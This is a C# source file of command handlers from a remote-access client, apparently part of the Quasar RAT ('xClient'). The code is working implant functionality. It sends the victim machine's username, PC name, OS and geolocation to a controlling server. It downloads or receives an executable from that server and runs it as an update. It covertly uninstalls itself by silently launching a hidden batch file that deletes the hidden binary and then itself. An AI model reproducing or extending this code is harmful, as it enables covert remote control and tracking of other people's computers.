using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using xClient.Config;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
        {
            GeoLocationHelper.Initialize();
            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                GeoLocationHelper.GeoInformation.country, GeoLocationHelper.GeoInformation.country_code, 
                GeoLocationHelper.GeoInformation.region, GeoLocationHelper.GeoInformation.city, GeoLocationHelper.ImageIndex, 
                SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName(), Settings.TAG).Execute(client);
        }

        public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            if (string.IsNullOrEmpty(command.DownloadURL))
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);

                try
                {
                    if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                        throw new Exception("No executable file");

                    FileSplit destFile = new FileSplit(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    {
                        new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                            client);
                        return;
                    }

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                    {
                        new Packets.ClientPackets.SetStatus("Updating...").Execute(client);

                        SystemCore.UpdateClient(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    NativeMethods.DeleteFile(filePath);
                    new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                }

                return;
            }

            new Thread(() =>
            {
                new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    FileHelper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Updating...").Execute(client);

                SystemCore.UpdateClient(client, tempFile);
            }).Start();
        }

        public static void HandleDoClientUninstall(Packets.ServerPackets.DoClientUninstall command, Client client)
        {
            new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);

            SystemCore.RemoveTraces();

            try
            {
                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    FileHelper.GetRandomFilename(12, ".bat"));

                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);
            }
            finally
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
        }
    }
}